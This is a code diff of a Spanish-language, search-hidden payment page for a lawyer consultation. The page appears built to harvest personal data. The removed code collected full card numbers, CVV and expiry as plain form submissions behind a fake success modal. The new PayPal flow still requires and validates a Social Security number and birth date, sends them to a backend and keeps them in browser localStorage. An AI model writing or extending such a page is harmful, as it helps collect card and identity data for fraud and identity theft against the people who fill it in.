@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>Consulta de Abogado - Realiza tu Pago</title>
+    <title>Pago de Consulta - Realiza tu Pago</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <style>
@@ -383,11 +383,14 @@
             }
         }
     </style>
-</head>
+    <!-- PayPal SDK -->
+    <script src="https://www.paypal.com/sdk/js?client-id=AZyElkuGTtZOQKbi8ZFTWu7Zl4gbfaWGvBYqPaH4aDX32QFJtlxhc4dfMvle4CSy0zTYH3lsSq2UxtEI&currency=USD&intent=capture" data-partner-attribution-id="YOUR_PARTNER_ID"></script>
+    <!-- REPLACE TEST_SB_CLIENT_ID con tu Client ID sandbox -->
+  </head>
 <body>
     <div class="container">
         <!-- Payment Form -->
-            <h1><i class="fas fa-credit-card"></i> Realiza tu Pago</h1>
+<h1><i class="fab fa-paypal"></i> Realiza tu Pago</h1>
             
 <form id="paymentForm" name="payment" method="POST" netlify>
             <div class="form-group">
@@ -444,34 +447,17 @@
                 <input type="text" id="cp" name="cp" maxlength="10" placeholder="Código postal" required>
             </div>
             
-            <div class="form-group">
-                <label><i class="fas fa-credit-card"></i> Información de Tarjeta</label>
-                <div class="card-row">
-                    <div style="position: relative;">
-                        <i class="fas fa-credit-card card-icon input-icon"></i>
-                        <input type="text" id="tarjeta" name="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                    </div>
-                    <div style="position: relative;">
-                        <i class="fas fa-lock cvv-icon input-icon"></i>
-                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
-                    </div>
-                    <div style="position: relative;">
-                        <i class="fas fa-calendar exp-icon input-icon"></i>
-                        <input type="text" id="expiracion" name="expiracion" placeholder="MM/AA" maxlength="5" required>
-                    </div>
-                </div>
-            </div>
+<!-- Campos tarjeta removidos - PayPal maneja pago seguro -->
+            <button type="button" id="continuarBtn" class="submit-btn">
+                <i class="fas fa-arrow-right"></i> Continuar a Pago
+            </button>
+            <div id="paypal-button-container" style="margin-top: 20px; display: none;"></div>
             
-            <div class="form-group">
-                <label for="nombre_tarjeta"><i class="fas fa-signature"></i> Nombre en Tarjeta</label>
-                <i class="fas fa-signature input-icon"></i>
-                <input type="text" id="nombre_tarjeta" name="nombre_tarjeta" placeholder="Como aparece en la tarjeta" required>
-            </div>
-            
-            <button type="submit" class="submit-btn">
-                <i class="fas fa-shield-alt"></i> Pago Seguro
+            <button type="button" id="payButton" class="submit-btn" style="display: none;">
+                <i class="fas fa-shield-alt"></i> Proceder a Pago Seguro
             </button>
         </form>
+        
     </div>
 
     <!-- Modal de éxito -->
@@ -487,16 +473,7 @@
     </div>
 
     <script>
-        // Formateo automático para tarjeta
-        document.getElementById('tarjeta').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
-            let formatted = '';
-            for (let i = 0; i < value.length; i += 4) {
-                formatted += value.slice(i, i + 4) + ' ';
-            }
-            e.target.value = formatted.trim().slice(0, 19);
-        });
-
+        // Mantener formateos útiles (teléfono, SSN)
         // Validación de correo electrónico
         document.getElementById('correo').addEventListener('input', function(e) {
             const email = e.target.value;
@@ -507,12 +484,7 @@
             }
         });
 
-        // Validación para CVV - solo números
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        });
-
-        // Formateo para teléfono payment (XXX-XXX-XXXX)
+        // Formateo para teléfono (XXX-XXX-XXXX)
         document.getElementById('telefono').addEventListener('input', function(e) {
             let value = e.target.value.replace(/[^\d]/g, '');
             let formatted = '';
@@ -532,89 +504,154 @@
             e.target.value = formatted.slice(0,11);
         });
 
-        // Formateo y validación para expiración MM/AA
-        document.getElementById('expiracion').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/[^\d]/g, '');
-            if (value.length >= 2) {
-                let mes = parseInt(value.slice(0, 2));
-                // Validar que el mes sea entre 01 y 12
-                if (mes > 12) {
-                    value = '12' + value.slice(2);
-                }
-                value = value.slice(0,2) + '/' + value.slice(2,4);
+        // Validación y flujo PayPal
+        function validarFormulario(formData) {
+            if (!formData.nombre || !formData.nombre.trim()) {
+                alert('Nombre es requerido');
+                document.getElementById('nombre').focus();
+                return false;
             }
-            e.target.value = value.slice(0,5);
-        });
-
-        // Submit nativo Netlify Forms con validaciones
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const form = this;
-            
-            // Validar correo
-            const correo = document.getElementById('correo').value;
-            if (!correo.includes('@')) {
-                alert('Por favor ingresa un correo válido con @');
+            if (!formData.apellido || !formData.apellido.trim()) {
+                alert('Apellido es requerido');
+                document.getElementById('apellido').focus();
+                return false;
+            }
+            if (!formData.correo || !formData.correo.includes('@')) {
+                alert('Correo electrónico válido es requerido');
+                document.getElementById('correo').focus();
                 document.getElementById('correo').classList.add('input-error');
                 return false;
             }
-            
-            // Validar MM/AA
-            const expiracion = document.getElementById('expiracion').value;
-            if (expiracion.length !== 5) {
-                alert('Por favor completa la fecha de expiración (MM/AA)');
+            const phoneNum = formData.telefono.replace(/[^0-9]/g, '');
+            if (!formData.telefono || phoneNum.length < 10) {
+                alert('Teléfono válido es requerido (10 dígitos)');
+                document.getElementById('telefono').focus();
                 return false;
             }
-            
-            const mes = parseInt(expiracion.slice(0, 2));
-            const anio = parseInt(expiracion.slice(3, 5));
-            
-            if (mes < 1 || mes > 12) {
-                alert('El mes debe estar entre 01 y 12');
+            if (!formData.seguro_social || formData.seguro_social.replace(/[^0-9]/g, '').length < 9) {
+                alert('Número de Seguro Social válido es requerido');
+                document.getElementById('seguro_social').focus();
                 return false;
             }
-            
-            // Validar que todos los campos requeridos estén llenos
-            const campos = ['nombre', 'apellido', 'correo', 'direccion', 'ciudad', 'cp', 'tarjeta', 'cvv', 'expiracion', 'nombre_tarjeta', 'telefono', 'seguro_social', 'fecha_cumpleanos'];
-            for (let campo of campos) {
-                const input = document.getElementById(campo);
-                if (!input.value.trim()) {
-                    alert('Por favor completa todos los campos');
-                    return false;
+            if (!formData.fecha_cumpleanos) {
+                alert('Fecha de cumpleaños es requerida');
+                document.getElementById('fecha_cumpleanos').focus();
+                return false;
+            }
+            if (!formData.direccion || !formData.direccion.trim()) {
+                alert('Dirección es requerida');
+                document.getElementById('direccion').focus();
+                return false;
+            }
+            if (!formData.ciudad || !formData.ciudad.trim()) {
+                alert('Ciudad es requerida');
+                document.getElementById('ciudad').focus();
+                return false;
+            }
+            if (!formData.cp || !formData.cp.trim()) {
+                alert('Código postal es requerido');
+                document.getElementById('cp').focus();
+                return false;
+            }
+            return true;
+        }
+
+        async function iniciarPago() {
+            // Recopilar datos del form
+            const formData = {
+                nombre: document.getElementById('nombre').value,
+                apellido: document.getElementById('apellido').value,
+                correo: document.getElementById('correo').value,
+                telefono: document.getElementById('telefono').value,
+                seguro_social: document.getElementById('seguro_social').value,
+                fecha_cumpleanos: document.getElementById('fecha_cumpleanos').value,
+                direccion: document.getElementById('direccion').value,
+                ciudad: document.getElementById('ciudad').value,
+                cp: document.getElementById('cp').value
+            };
+
+            // Validar formulario
+            if (!validarFormulario(formData)) return;
+
+            try {
+                // Mostrar loading
+                document.getElementById('continuarBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creando orden...';
+                document.getElementById('continuarBtn').disabled = true;
+
+                // 1. Crear orden en backend
+                const response = await fetch('/.netlify/functions/orders', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'create', formData })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Error creando orden: ' + response.statusText);
                 }
+
+                const { orderID } = await response.json();
+
+                // 2. Render PayPal buttons
+                paypal.Buttons({
+                    createOrder: function() {
+                        return orderID;
+                    },
+                    onApprove: async function(data) {
+                        try {
+                            // 3. Capturar pago
+                            const captureResponse = await fetch('/.netlify/functions/orders', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ action: 'capture', orderID, formData })
+                            });
+
+                            if (!captureResponse.ok) {
+                                throw new Error('Error capturando pago: ' + captureResponse.statusText);
+                            }
+
+                            const captureData = await captureResponse.json();
+
+                            if (captureData.success) {
+                                // Guardar datos en localStorage para success page
+                                localStorage.setItem('paymentData', JSON.stringify({
+                                    orderID,
+                                    formData,
+                                    timestamp: new Date().toISOString()
+                                }));
+                                // Redirect a success con details
+                                window.location.href = `success.html?orderID=${orderID}&timestamp=${new Date().toISOString()}`;
+                            } else {
+                                alert('Error en captura de pago: ' + captureData.error);
+                            }
+                        } catch (error) {
+                            console.error('Error en captura:', error);
+                            alert('Error procesando el pago: ' + error.message);
+                        }
+                    },
+                    onCancel: function() {
+                        alert('Pago cancelado por el usuario');
+                    },
+                    onError: function(err) {
+                        console.error('PayPal error:', err);
+                        alert('Error en PayPal: ' + (err.message || 'Error desconocido'));
+                    }
+                }).render('#paypal-button-container');
+
+                // Ocultar botón continuar y mostrar PayPal
+                document.getElementById('continuarBtn').style.display = 'none';
+                document.getElementById('paypal-button-container').style.display = 'block';
+
+            } catch (error) {
+                console.error('Error creando orden:', error);
+                alert('Error creando orden de pago: ' + error.message);
+                // Reset button
+                document.getElementById('continuarBtn').innerHTML = '<i class="fas fa-arrow-right"></i> Continuar a Pago';
+                document.getElementById('continuarBtn').disabled = false;
             }
-            
-            // Validar teléfono
-            const telefono = document.getElementById('telefono').value;
-            if (telefono.replace(/[^0-9]/g, '').length < 10) {
-                alert('Por favor ingresa un teléfono válido');
-                return false;
-            }
-            
-            // Validar tarjeta
-            const tarjeta = document.getElementById('tarjeta').value.replace(/\s/g, '');
-            if (tarjeta.length !== 16) {
-                alert('La tarjeta debe tener 16 dígitos');
-                return false;
-            }
-            
-            // Validar CVV
-            const cvv = document.getElementById('cvv').value;
-            if (cvv.length < 3) {
-                alert('El CVV debe tener 3 o 4 dígitos');
-                return false;
-            }
-            
-            // Si todas las validaciones pasan, mostrar modal y luego enviar a Netlify
-            console.log('Todas las validaciones pasaron, mostrando modal y enviando a Netlify...');
-            document.getElementById('correo').classList.remove('input-error');
-            document.getElementById('successModal').style.display = 'flex';
-            
-            // Enviar el formulario a Netlify después de mostrar el modal
-            setTimeout(() => {
-                form.submit();
-            }, 3000);
-        });
+        }
+
+        // Event listener para el botón continuar
+        document.getElementById('continuarBtn').onclick = iniciarPago;
 
         // Cerrar modal
         function closeModal() {
